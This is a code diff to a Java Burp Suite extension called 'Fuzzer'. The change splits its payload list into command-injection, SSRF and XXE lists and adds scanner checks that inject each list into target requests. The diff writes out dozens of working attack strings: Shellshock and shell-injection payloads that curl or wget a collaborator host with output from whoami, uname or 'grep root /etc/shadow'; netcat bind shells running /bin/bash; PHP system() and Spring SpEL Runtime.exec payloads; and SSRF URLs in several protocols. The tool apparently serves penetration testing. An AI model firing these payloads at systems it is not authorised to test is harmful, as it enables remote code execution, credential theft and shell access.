@@ -38,8 +38,7 @@ import javax.swing.SwingUtilities;
 import javax.swing.filechooser.FileSystemView;
 import javax.swing.table.DefaultTableModel;
 
-
-public class BurpExtender implements IBurpExtender, IScannerCheck, ITab
+public class BurpExtender implements IBurpExtender, ITab
 {
 	private JPanel MainPane;
 	private JTextField textField,filetextField;
@@ -49,7 +48,7 @@ public class BurpExtender implements IBurpExtender, IScannerCheck, ITab
 	private JScrollPane Header_scroll,command_scroll,Param_scroll;
 	private JScrollPane scrolltab;
 	 
-	private IBurpExtenderCallbacks callbacks;
+	public static IBurpExtenderCallbacks callbacks;
     private IExtensionHelpers helpers;
     private OutputStream output;
     private IBurpCollaboratorClientContext collaborator;
@@ -57,7 +56,7 @@ public class BurpExtender implements IBurpExtender, IScannerCheck, ITab
     
     IHttpRequestResponse checkRequestResponse;
     HashSet<String> overallparams;
-    List<String> payloads;
+    public static List<String> payloads,ssrf_payloads,xxe_payloads,cmd_payloads;
     JPanel optionspan,optionspan1,optionspan2,optionspan3,optionspan4,optionspan5,optionspan6,optionspan7;
     JCheckBox checkbox1,checkbox2,checkbox3,checkbox4,checkbox5,checkbox6,checkbox7,checkbox8,checkbox9,checkbox10,checkbox11,checkbox12,checkbox13,checkbox14,checkbox15,checkbox16,checkbox17,checkbox18,checkbox19,checkbox20,checkbox21,checkbox22,checkbox23,checkbox24,checkbox25,checkbox26;
     JFileChooser jfc;
@@ -69,10 +68,7 @@ public class BurpExtender implements IBurpExtender, IScannerCheck, ITab
 	public void registerExtenderCallbacks(final IBurpExtenderCallbacks callbacks) 
 	{
 		// keep a reference to our callbacks object
-        this.callbacks = callbacks;
-        		
-		// keep a reference to our callbacks object
-		this.callbacks = callbacks;
+		BurpExtender.callbacks = callbacks;
 
 		// obtain an extension helpers object
 		helpers = callbacks.getHelpers();
@@ -80,16 +76,21 @@ public class BurpExtender implements IBurpExtender, IScannerCheck, ITab
 		// set our extension name
 		callbacks.setExtensionName("Fuzzer");
 
-		// register ourselves as a custom scanner check
-		callbacks.registerScannerCheck(this);
-		
-				
+						
 		//get the output stream for info messages
 		output = callbacks.getStdout();
 		
 		overallparams=new HashSet<String>();
 		payloads=new ArrayList<String>();
+		ssrf_payloads=new ArrayList<String>();
+		xxe_payloads=new ArrayList<String>();
+		cmd_payloads=new ArrayList<String>();
 		
+		// register ourselves as a custom scanner check
+		callbacks.registerScannerCheck(new JavaDeserializeScan());
+		callbacks.registerScannerCheck(new SSRFScan());
+		callbacks.registerScannerCheck(new XXEScan());
+		callbacks.registerScannerCheck(new CmdInjscan());
 		/* 
 		 * Building UI tab for user inputs
 		 */
@@ -274,7 +275,22 @@ public class BurpExtender implements IBurpExtender, IScannerCheck, ITab
 							sb.append(payloads.get(i));
 							sb.append("\n");
 						}
-			            
+						for(int i=0;i<xxe_payloads.size();i++)
+						{
+							sb.append(xxe_payloads.get(i));
+							sb.append("\n");
+						}
+						for(int i=0;i<ssrf_payloads.size();i++)
+						{
+							sb.append(ssrf_payloads.get(i));
+							sb.append("\n");
+						}
+						for(int i=0;i<cmd_payloads.size();i++)
+						{
+							sb.append(cmd_payloads.get(i));
+							sb.append("\n");
+						}
+						
 						cb.setContents(new StringSelection(sb.toString()), new StringSelection(sb.toString()));
 					}
 				});
@@ -514,67 +530,67 @@ public class BurpExtender implements IBurpExtender, IScannerCheck, ITab
 		 					
 		 					if(commands.get(i).equalsIgnoreCase("CMDInj"))
 		 					{
-		 						payloads.add("& ping -i "+burpcollab+" &");
-		 						payloads.add("& ping -n "+burpcollab+" &");
-		 						payloads.add("%0a ping -i "+burpcollab+" %0a");
-		 						payloads.add("'ping "+burpcollab+"'");
-		 						payloads.add("() { :;};/usr/bin/perl -e 'print \"Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!\";system(\"wget http://"+burpcollab+"/.testing/shellshock.txt?vuln=13;curl http://"+burpcollab+"/.testing/shellshock.txt?vuln=15;\");'");
-		 						payloads.add("() { :;}; wget http://"+burpcollab+"/.testing/shellshock.txt?vuln=11");
-		 						payloads.add("| wget http://"+burpcollab+"/.testing/rce.txt");
-		 						payloads.add("& wget http://"+burpcollab+"/.testing/rce.txt");
-		 						payloads.add("; wget http://"+burpcollab+"/.testing/rce_vuln.txt");
-		 						payloads.add("$('wget http://"+burpcollab+"/.testing/rce_vuln.txt')");
+		 						cmd_payloads.add("& ping -i "+burpcollab+" &");
+		 						cmd_payloads.add("& ping -n "+burpcollab+" &");
+		 						cmd_payloads.add("%0a ping -i "+burpcollab+" %0a");
+		 						cmd_payloads.add("'ping "+burpcollab+"'");
+		 						cmd_payloads.add("() { :;};/usr/bin/perl -e 'print \"Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!\";system(\"wget http://"+burpcollab+"/.testing/shellshock.txt?vuln=13;curl http://"+burpcollab+"/.testing/shellshock.txt?vuln=15;\");'");
+		 						cmd_payloads.add("() { :;}; wget http://"+burpcollab+"/.testing/shellshock.txt?vuln=11");
+		 						cmd_payloads.add("| wget http://"+burpcollab+"/.testing/rce.txt");
+		 						cmd_payloads.add("& wget http://"+burpcollab+"/.testing/rce.txt");
+		 						cmd_payloads.add("; wget http://"+burpcollab+"/.testing/rce_vuln.txt");
+		 						cmd_payloads.add("$('wget http://"+burpcollab+"/.testing/rce_vuln.txt')");
 		 						
-		 						payloads.add("&& wget http://"+burpcollab+"/.testing/rce_vuln.txt");
-		 						payloads.add("wget http://"+burpcollab+"/.testing/rce_vuln.txt");
-		 						payloads.add("$('wget http://"+burpcollab+"/.testing/rce_vuln.txt?req=22jjffjbn')");
-		 						payloads.add("system('wget http://"+burpcollab+"/.testing/rce_vuln.txt?req=22fd2w23')");
-		 						payloads.add("system('wget http://"+burpcollab+"/.testing/rce_vuln.txt');");
-		 						payloads.add("|| system('curl http://"+burpcollab+"/.testing/rce_vuln.txt');");
-		 						payloads.add("| system('curl http://"+burpcollab+"/.testing/rce_vuln.txt');");
-		 						payloads.add("; system('curl http://"+burpcollab+"/.testing/rce_vuln.txt');");
-		 						payloads.add("& system('curl http://"+burpcollab+"/.testing/rce_vuln.txt');");
-		 						payloads.add("&& system('curl http://"+burpcollab+"/.testing/rce_vuln.txt');");
+		 						cmd_payloads.add("&& wget http://"+burpcollab+"/.testing/rce_vuln.txt");
+		 						cmd_payloads.add("wget http://"+burpcollab+"/.testing/rce_vuln.txt");
+		 						cmd_payloads.add("$('wget http://"+burpcollab+"/.testing/rce_vuln.txt?req=22jjffjbn')");
+		 						cmd_payloads.add("system('wget http://"+burpcollab+"/.testing/rce_vuln.txt?req=22fd2w23')");
+		 						cmd_payloads.add("system('wget http://"+burpcollab+"/.testing/rce_vuln.txt');");
+		 						cmd_payloads.add("|| system('curl http://"+burpcollab+"/.testing/rce_vuln.txt');");
+		 						cmd_payloads.add("| system('curl http://"+burpcollab+"/.testing/rce_vuln.txt');");
+		 						cmd_payloads.add("; system('curl http://"+burpcollab+"/.testing/rce_vuln.txt');");
+		 						cmd_payloads.add("& system('curl http://"+burpcollab+"/.testing/rce_vuln.txt');");
+		 						cmd_payloads.add("&& system('curl http://"+burpcollab+"/.testing/rce_vuln.txt');");
 		 						
-		 						payloads.add("system('curl http://"+burpcollab+"/.testing/rce_vuln.txt')");
-		 						payloads.add("system('curl http://"+burpcollab+"/.testing/rce_vuln.txt?req=22fd2wdf')");
-		 						payloads.add("system('curl http://"+burpcollab+"/.testing/rce_vuln.txt');");
+		 						cmd_payloads.add("system('curl http://"+burpcollab+"/.testing/rce_vuln.txt')");
+		 						cmd_payloads.add("system('curl http://"+burpcollab+"/.testing/rce_vuln.txt?req=22fd2wdf')");
+		 						cmd_payloads.add("system('curl http://"+burpcollab+"/.testing/rce_vuln.txt');");
 		 						
-		 						payloads.add("<?php system(\"curl http://"+burpcollab+"/.testing/rce_vuln.txt?method=phpsystem_get\");?>");
-		 						payloads.add("<?php system(\"curl http://"+burpcollab+"/.testing/rce_vuln.txt?req=df2fkjj\");?>");
-		 						payloads.add("<?php system(\"wget http://"+burpcollab+"/.testing/rce_vuln.txt?method=phpsystem_get\");?>");
-		 						payloads.add("<?php system(\"wget http://"+burpcollab+"/.testing/rce_vuln.txt?req=jdfj2jc\");?>");
+		 						cmd_payloads.add("<?php system(\"curl http://"+burpcollab+"/.testing/rce_vuln.txt?method=phpsystem_get\");?>");
+		 						cmd_payloads.add("<?php system(\"curl http://"+burpcollab+"/.testing/rce_vuln.txt?req=df2fkjj\");?>");
+		 						cmd_payloads.add("<?php system(\"wget http://"+burpcollab+"/.testing/rce_vuln.txt?method=phpsystem_get\");?>");
+		 						cmd_payloads.add("<?php system(\"wget http://"+burpcollab+"/.testing/rce_vuln.txt?req=jdfj2jc\");?>");
 		 						
-		 						payloads.add("\n\033[2curl http://"+burpcollab+"/.testing/term_escape.txt?vuln=1?user=\'whoami\'");
-		 						payloads.add("\n\033[2wget http://"+burpcollab+"/.testing/term_escape.txt?vuln=2?user=\'whoami\'");
-		 						payloads.add("\necho INJECTX\nexit\n\033[2Acurl https://"+burpcollab+"/.testing/rce_vuln.txt\n");
-		 						payloads.add("\n\033[2wget http://"+burpcollab+"/.testing/term_escape.txt?vuln=2?user=\'whoami\'");
+		 						cmd_payloads.add("\n\033[2curl http://"+burpcollab+"/.testing/term_escape.txt?vuln=1?user=\'whoami\'");
+		 						cmd_payloads.add("\n\033[2wget http://"+burpcollab+"/.testing/term_escape.txt?vuln=2?user=\'whoami\'");
+		 						cmd_payloads.add("\necho INJECTX\nexit\n\033[2Acurl https://"+burpcollab+"/.testing/rce_vuln.txt\n");
+		 						cmd_payloads.add("\n\033[2wget http://"+burpcollab+"/.testing/term_escape.txt?vuln=2?user=\'whoami\'");
 		 						
-		 						payloads.add("() { :;}; /bin/bash -c \"curl http://"+burpcollab+"/.testing/shellshock.txt?vuln=16?user=\'whoami\'\"");
-		 						payloads.add("() { :;}; /bin/bash -c \"curl http://"+burpcollab+"/.testing/shellshock.txt?vuln=18?pwd=\'pwd\'\"");
-		 						payloads.add("() { :;}; /bin/bash -c \"curl http://"+burpcollab+"/.testing/shellshock.txt?vuln=20?shadow=\'grep root /etc/shadow\'\"");
-		 						payloads.add("() { :;}; /bin/bash -c \"curl http://"+burpcollab+"/.testing/shellshock.txt?vuln=22?uname=\'uname -a\'\"");
-		 						payloads.add("() { :;}; /bin/bash -c \"curl http://"+burpcollab+"/.testing/shellshock.txt?vuln=24?shell=\'nc -lvvp 1234 -e /bin/bash\'\"");
-		 						payloads.add("() { :;}; /bin/bash -c \"curl http://"+burpcollab+"/.testing/shellshock.txt?vuln=26?shell=\'nc -lvvp 1236 -e /bin/bash &\'\"");
-		 						payloads.add("() { :;}; /bin/bash -c \"curl http://"+burpcollab+"/.testing/shellshock.txt?vuln=5\"");
-		 						payloads.add("() { :;}; /bin/bash -c \"sleep 1 && curl http://"+burpcollab+"/.testing/shellshock.txt?sleep=1&?vuln=6\"");
-		 						payloads.add("() { :;}; /bin/bash -c \"sleep 3 && curl http://"+burpcollab+"/.testing/shellshock.txt?sleep=3&?vuln=7\"");
-		 						payloads.add("() { :;}; /bin/bash -c \"sleep 6 && curl http://"+burpcollab+"/.testing/shellshock.txt?sleep=6&?vuln=8\"");
-		 						payloads.add("() { :;}; /bin/bash -c \"sleep 6 && curl http://"+burpcollab+"/.testing/shellshock.txt?sleep=9&?vuln=9\"");
-		 						payloads.add("() { :;}; /bin/bash -c \"wget http://"+burpcollab+"/.testing/shellshock.txt?vuln=17?user=\'whoami\'\"");
-		 						payloads.add("() { :;}; /bin/bash -c \"wget http://"+burpcollab+"/.testing/shellshock.txt?vuln=19?pwd=\'pwd\'\"");
-		 						payloads.add("() { :;}; /bin/bash -c \"wget http://"+burpcollab+"/.testing/shellshock.txt?vuln=21?shadow=\'grep root /etc/shadow\'\"");
-		 						payloads.add("() { :;}; /bin/bash -c \"wget http://"+burpcollab+"/.testing/shellshock.txt?vuln=23?uname=\'uname -a\'\"");
-		 						payloads.add("() { :;}; /bin/bash -c \"wget http://"+burpcollab+"/.testing/shellshock.txt?vuln=25?shell=\'nc -lvvp 1235 -e /bin/bash\'\"");
-		 						payloads.add("() { :;}; /bin/bash -c \"wget http://"+burpcollab+"/.testing/shellshock.txt?vuln=27?shell=\'nc -lvvp 1237 -e /bin/bash &\'\"");
-		 						payloads.add("() { :;}; /bin/bash -c \"wget http://"+burpcollab+"/.testing/shellshock.txt?vuln=4\"");
+		 						cmd_payloads.add("() { :;}; /bin/bash -c \"curl http://"+burpcollab+"/.testing/shellshock.txt?vuln=16?user=\'whoami\'\"");
+		 						cmd_payloads.add("() { :;}; /bin/bash -c \"curl http://"+burpcollab+"/.testing/shellshock.txt?vuln=18?pwd=\'pwd\'\"");
+		 						cmd_payloads.add("() { :;}; /bin/bash -c \"curl http://"+burpcollab+"/.testing/shellshock.txt?vuln=20?shadow=\'grep root /etc/shadow\'\"");
+		 						cmd_payloads.add("() { :;}; /bin/bash -c \"curl http://"+burpcollab+"/.testing/shellshock.txt?vuln=22?uname=\'uname -a\'\"");
+		 						cmd_payloads.add("() { :;}; /bin/bash -c \"curl http://"+burpcollab+"/.testing/shellshock.txt?vuln=24?shell=\'nc -lvvp 1234 -e /bin/bash\'\"");
+		 						cmd_payloads.add("() { :;}; /bin/bash -c \"curl http://"+burpcollab+"/.testing/shellshock.txt?vuln=26?shell=\'nc -lvvp 1236 -e /bin/bash &\'\"");
+		 						cmd_payloads.add("() { :;}; /bin/bash -c \"curl http://"+burpcollab+"/.testing/shellshock.txt?vuln=5\"");
+		 						cmd_payloads.add("() { :;}; /bin/bash -c \"sleep 1 && curl http://"+burpcollab+"/.testing/shellshock.txt?sleep=1&?vuln=6\"");
+		 						cmd_payloads.add("() { :;}; /bin/bash -c \"sleep 3 && curl http://"+burpcollab+"/.testing/shellshock.txt?sleep=3&?vuln=7\"");
+		 						cmd_payloads.add("() { :;}; /bin/bash -c \"sleep 6 && curl http://"+burpcollab+"/.testing/shellshock.txt?sleep=6&?vuln=8\"");
+		 						cmd_payloads.add("() { :;}; /bin/bash -c \"sleep 6 && curl http://"+burpcollab+"/.testing/shellshock.txt?sleep=9&?vuln=9\"");
+		 						cmd_payloads.add("() { :;}; /bin/bash -c \"wget http://"+burpcollab+"/.testing/shellshock.txt?vuln=17?user=\'whoami\'\"");
+		 						cmd_payloads.add("() { :;}; /bin/bash -c \"wget http://"+burpcollab+"/.testing/shellshock.txt?vuln=19?pwd=\'pwd\'\"");
+		 						cmd_payloads.add("() { :;}; /bin/bash -c \"wget http://"+burpcollab+"/.testing/shellshock.txt?vuln=21?shadow=\'grep root /etc/shadow\'\"");
+		 						cmd_payloads.add("() { :;}; /bin/bash -c \"wget http://"+burpcollab+"/.testing/shellshock.txt?vuln=23?uname=\'uname -a\'\"");
+		 						cmd_payloads.add("() { :;}; /bin/bash -c \"wget http://"+burpcollab+"/.testing/shellshock.txt?vuln=25?shell=\'nc -lvvp 1235 -e /bin/bash\'\"");
+		 						cmd_payloads.add("() { :;}; /bin/bash -c \"wget http://"+burpcollab+"/.testing/shellshock.txt?vuln=27?shell=\'nc -lvvp 1237 -e /bin/bash &\'\"");
+		 						cmd_payloads.add("() { :;}; /bin/bash -c \"wget http://"+burpcollab+"/.testing/shellshock.txt?vuln=4\"");
 		 						
-		 						payloads.add("T(org.springframework.util.StreamUtils).copy(T(java.lang.Runtime).getRuntime().exec(\"ping "+burpcollab+"\").getInputStream(), T(org.springframework.web.context.request.RequestContextHolder).currentRequestAttributes().getResponse().getOutputStream()).x");
-		 						payloads.add("T(org.springframework.util.StreamUtils).copy(T(java.lang.Runtime).getRuntime().exec(\"wget http://"+burpcollab+"\").getInputStream(), T(org.springframework.web.context.request.RequestContextHolder).currentRequestAttributes().getResponse().getOutputStream()).x");
-		 						payloads.add("T(org.springframework.util.StreamUtils).copy(T(java.lang.Runtime).getRuntime().exec(\"curl http://"+burpcollab+"\").getInputStream(), T(org.springframework.web.context.request.RequestContextHolder).currentRequestAttributes().getResponse().getOutputStream()).x");
-		 						payloads.add("T(java.lang.Runtime).getRuntime().exec('ping "+burpcollab+"')");
-		 						payloads.add("T(java.lang.Runtime).getRuntime().exec('wget http://"+burpcollab+"')");
-		 						payloads.add("T(java.lang.Runtime).getRuntime().exec('curl http://"+burpcollab+"')");
+		 						cmd_payloads.add("T(org.springframework.util.StreamUtils).copy(T(java.lang.Runtime).getRuntime().exec(\"ping "+burpcollab+"\").getInputStream(), T(org.springframework.web.context.request.RequestContextHolder).currentRequestAttributes().getResponse().getOutputStream()).x");
+		 						cmd_payloads.add("T(org.springframework.util.StreamUtils).copy(T(java.lang.Runtime).getRuntime().exec(\"wget http://"+burpcollab+"\").getInputStream(), T(org.springframework.web.context.request.RequestContextHolder).currentRequestAttributes().getResponse().getOutputStream()).x");
+		 						cmd_payloads.add("T(org.springframework.util.StreamUtils).copy(T(java.lang.Runtime).getRuntime().exec(\"curl http://"+burpcollab+"\").getInputStream(), T(org.springframework.web.context.request.RequestContextHolder).currentRequestAttributes().getResponse().getOutputStream()).x");
+		 						cmd_payloads.add("T(java.lang.Runtime).getRuntime().exec('ping "+burpcollab+"')");
+		 						cmd_payloads.add("T(java.lang.Runtime).getRuntime().exec('wget http://"+burpcollab+"')");
+		 						cmd_payloads.add("T(java.lang.Runtime).getRuntime().exec('curl http://"+burpcollab+"')");
 		 						
 		 						String[] cmdpayl={"CommandInjection","CommandInjectionPayloads Added"};
 		 						Header_dtm.addRow(cmdpayl);
@@ -587,14 +603,14 @@ public class BurpExtender implements IBurpExtender, IScannerCheck, ITab
 		 					}
 		 					else if(commands.get(i).equalsIgnoreCase("SSRF"))
 		 					{
-		 						payloads.add("dict://"+burpcollab);
-		 						payloads.add("sftp://"+burpcollab);
-		 						payloads.add("tftp://"+burpcollab);
-		 						payloads.add("ftp://"+burpcollab);
-		 						payloads.add("ldap://"+burpcollab);
-		 						payloads.add("gopher://"+burpcollab);
-		 						payloads.add("http://"+burpcollab);
-		 						payloads.add("https://"+burpcollab);
+		 						ssrf_payloads.add("dict://"+burpcollab);
+		 						ssrf_payloads.add("sftp://"+burpcollab);
+		 						ssrf_payloads.add("tftp://"+burpcollab);
+		 						ssrf_payloads.add("ftp://"+burpcollab);
+		 						ssrf_payloads.add("ldap://"+burpcollab);
+		 						ssrf_payloads.add("gopher://"+burpcollab);
+		 						ssrf_payloads.add("http://"+burpcollab);
+		 						ssrf_payloads.add("https://"+burpcollab);
 		 						
 		 						String[] ssrfpayl={"SSRF","SSRF payloads Added"};
 		 						Header_dtm.addRow(ssrfpayl);
@@ -619,10 +635,10 @@ public class BurpExtender implements IBurpExtender, IScannerCheck, ITab
 		 						String[] solrxxerow={"XXEsolr",solrxxe};
 		 						Header_dtm.addRow(solrxxerow);
 		 						
-		 						payloads.add(xxepayload);
-		 						payloads.add(soapxxe);
-		 						payloads.add(classicXXE);
-		 						payloads.add(solrxxe);
+		 						xxe_payloads.add(xxepayload);
+		 						xxe_payloads.add(soapxxe);
+		 						xxe_payloads.add(classicXXE);
+		 						xxe_payloads.add(solrxxe);
 		 					}
 		 					else
 		 					{
@@ -727,37 +743,6 @@ public class BurpExtender implements IBurpExtender, IScannerCheck, ITab
 			return sb.toString();
 		}
 
-		
-	@Override
-	public List<IScanIssue> doPassiveScan(IHttpRequestResponse baseRequestResponse) 
-	{				
-		return null;
-				
-	}
-	
-	@Override
-	public List<IScanIssue> doActiveScan(IHttpRequestResponse baseRequestResponse, IScannerInsertionPoint insertionPoint) 
-	{
-		IHttpService httpService=baseRequestResponse.getHttpService();
-		byte[] completeReq=null;
-		for(int i=0;i<payloads.size();i++)
-		{
-			completeReq = insertionPoint.buildRequest(payloads.get(i).getBytes());
-			IHttpRequestResponse checkRequestResponse = callbacks.makeHttpRequest(
-	                baseRequestResponse.getHttpService(), callbacks.makeHttpRequest(httpService, completeReq).getRequest());
-		}
-		
-		return null;
-	}
-	
-	@Override
-	public int consolidateDuplicateIssues(IScanIssue existingIssue, IScanIssue newIssue) 
-	{
-		if(existingIssue.getHttpMessages().equals(newIssue.getHttpMessages()))
-			return -1;
-		else
-			return 0;
-	}
 	
 	private void println(String toPrint) 
 	{
@@ -771,7 +756,141 @@ public class BurpExtender implements IBurpExtender, IScannerCheck, ITab
 		{
 		    ioe.printStackTrace();
 		} 
-	 }
+	 }	
+}
+
+//Running Java Deserialization vulnerablity Tests..
+class JavaDeserializeScan implements IScannerCheck
+{
 	
+	@Override
+	public List<IScanIssue> doPassiveScan(IHttpRequestResponse baseRequestResponse) {
+		// TODO Auto-generated method stub
+		return null;
+	}
+
+	@Override
+	public List<IScanIssue> doActiveScan(IHttpRequestResponse baseRequestResponse,
+			IScannerInsertionPoint insertionPoint) 
+	{
+		IHttpService httpService=baseRequestResponse.getHttpService();
+		byte[] completeReq=null;
+		for(int i=0;i<BurpExtender.payloads.size();i++)
+		{
+			completeReq = insertionPoint.buildRequest(BurpExtender.payloads.get(i).getBytes());
+			IHttpRequestResponse checkRequestResponse = BurpExtender.callbacks.makeHttpRequest(
+	                baseRequestResponse.getHttpService(), BurpExtender.callbacks.makeHttpRequest(httpService, completeReq).getRequest());
+		}
 		
+		return null;
+	}
+
+	@Override
+	public int consolidateDuplicateIssues(IScanIssue existingIssue, IScanIssue newIssue) {
+		// TODO Auto-generated method stub
+		return 0;
+	}
+	
+}
+
+//Running SSRF Tests..
+class SSRFScan implements IScannerCheck
+{
+	
+	@Override
+	public List<IScanIssue> doPassiveScan(IHttpRequestResponse baseRequestResponse) {
+		// TODO Auto-generated method stub
+		return null;
+	}
+
+	@Override
+	public List<IScanIssue> doActiveScan(IHttpRequestResponse baseRequestResponse,
+			IScannerInsertionPoint insertionPoint) 
+	{
+		IHttpService httpService=baseRequestResponse.getHttpService();
+		byte[] completeReq=null;
+		for(int i=0;i<BurpExtender.ssrf_payloads.size();i++)
+		{
+			completeReq = insertionPoint.buildRequest(BurpExtender.ssrf_payloads.get(i).getBytes());
+			IHttpRequestResponse checkRequestResponse = BurpExtender.callbacks.makeHttpRequest(
+	                baseRequestResponse.getHttpService(), BurpExtender.callbacks.makeHttpRequest(httpService, completeReq).getRequest());
+		}
+		
+		return null;
+	}
+
+	@Override
+	public int consolidateDuplicateIssues(IScanIssue existingIssue, IScanIssue newIssue) {
+		// TODO Auto-generated method stub
+		return 0;
+	}
+	
+}
+
+//Running XXE Tests..
+class XXEScan implements IScannerCheck
+{
+		
+	@Override
+	public List<IScanIssue> doPassiveScan(IHttpRequestResponse baseRequestResponse) {
+		// TODO Auto-generated method stub
+		return null;
+	}
+
+	@Override
+	public List<IScanIssue> doActiveScan(IHttpRequestResponse baseRequestResponse,
+			IScannerInsertionPoint insertionPoint) 
+	{
+		IHttpService httpService=baseRequestResponse.getHttpService();
+		byte[] completeReq=null;
+		for(int i=0;i<BurpExtender.xxe_payloads.size();i++)
+		{
+			completeReq = insertionPoint.buildRequest(BurpExtender.xxe_payloads.get(i).getBytes());
+			IHttpRequestResponse checkRequestResponse = BurpExtender.callbacks.makeHttpRequest(
+	                baseRequestResponse.getHttpService(), BurpExtender.callbacks.makeHttpRequest(httpService, completeReq).getRequest());
+		}
+		
+		return null;
+	}
+
+	@Override
+	public int consolidateDuplicateIssues(IScanIssue existingIssue, IScanIssue newIssue) {
+		// TODO Auto-generated method stub
+		return 0;
+	}
+	
+}
+
+//Running command Injection checks..
+class CmdInjscan implements IScannerCheck
+{
+		
+	@Override
+	public List<IScanIssue> doPassiveScan(IHttpRequestResponse baseRequestResponse) {
+		// TODO Auto-generated method stub
+		return null;
+	}
+
+	@Override
+	public List<IScanIssue> doActiveScan(IHttpRequestResponse baseRequestResponse,
+			IScannerInsertionPoint insertionPoint) 
+	{
+		IHttpService httpService=baseRequestResponse.getHttpService();
+		byte[] completeReq=null;
+		for(int i=0;i<BurpExtender.cmd_payloads.size();i++)
+		{
+			completeReq = insertionPoint.buildRequest(BurpExtender.cmd_payloads.get(i).getBytes());
+			IHttpRequestResponse checkRequestResponse = BurpExtender.callbacks.makeHttpRequest(
+	                baseRequestResponse.getHttpService(), BurpExtender.callbacks.makeHttpRequest(httpService, completeReq).getRequest());
+		}
+		
+		return null;
+	}
+
+	@Override
+	public int consolidateDuplicateIssues(IScanIssue existingIssue, IScanIssue newIssue) {
+		// TODO Auto-generated method stub
+		return 0;
+	}
+	
 }
